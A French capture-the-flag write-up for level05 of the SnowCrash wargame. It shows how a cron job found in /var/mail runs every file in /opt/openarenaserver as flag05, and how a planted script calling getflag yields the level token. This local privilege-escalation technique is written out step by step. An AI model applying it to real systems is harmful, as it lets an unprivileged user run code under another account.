# Level05

</br></br>

## vérifier fichier

```sh
level05@SnowCrash:~$ find / -name "level05" 2>/dev/null
/var/mail/level05
/rofs/var/mail/level05
```

</br></br>

## vérifier mail

```sh
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Il dit d'exécuter le script /usr/sbin/openarenaserver avec l'autorisation flag05 toutes les 2 minutes.

</br></br>

## /usr/sbin/openarenaserver

```sh
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Ce script exécute de manière récursive tous les fichiers du répertoire /opt/openarenaserver/ et définit un délai d'attente du processeur de 5 secondes pour chaque exécution de fichier. Ensuite, les fichiers dont l'exécution est terminée sont supprimés.

</br></br>

## Créer un exécutable getflag dans /opt/openarenaserver

On peut pas créer /tmp/level05/flag05 avec redirection!

```sh
level05@SnowCrash:~$ mkdir /tmp/level05
level05@SnowCrash:~$ ls -ld /tmp/level05
drwxrwxr-x 2 level05 level05 40 Aug 28 23:03 /tmp/level05
```

Seul "level05" a le droit de créer des fichiers dans ce dossier

```sh
level05@SnowCrash:~$ ls -ld /tmp
d-wx-wx-wx 5 root root 120 Aug 28 23:16 /tmp
```

donc, on peut le faire la redirection à /tmp

```sh
level05@SnowCrash:~$ vim /opt/openarenaserver/getflag.sh
#!/bin/bash
/bin/getflag > /tmp/flag05
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/getflag.sh
```

```sh
level05@SnowCrash:/tmp/level05$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:/tmp/level05$ su level06
Password:
level06@SnowCrash:~$
```
